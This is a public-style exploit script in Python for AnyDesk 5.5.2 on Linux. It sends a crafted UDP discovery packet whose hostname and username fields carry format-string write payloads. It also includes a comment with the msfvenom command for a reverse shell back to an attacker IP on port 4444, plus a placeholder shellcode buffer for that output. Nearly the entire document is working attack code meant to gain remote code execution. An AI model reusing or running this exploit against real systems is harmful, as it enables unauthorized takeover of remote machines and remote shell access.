# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Original Exploit Author: scryh
# Exploit Additions Made By: Zachary Morris
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = 'TARGET_IP'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])
    d += struct.pack('>I', len(hn)) + hn.encode('latin1')
    d += struct.pack('>I', len(user)) + user.encode('latin1')
    d += struct.pack('>I', 0)
    d += struct.pack('>I', len(inf)) + inf.encode('latin1')
    d += bytes([0])
    d += struct.pack('>I', len(func)) + func.encode('latin1')
    d += bytes([0x2, 0xc3, 0x51])
    return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
# Replace the following shellcode with the output shellcode from the above command:
shellcode =  b""
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"

shellcode_str = "".join([chr(b) for b in shellcode])  # Convert bytes to a string

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln' + shellcode_str, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
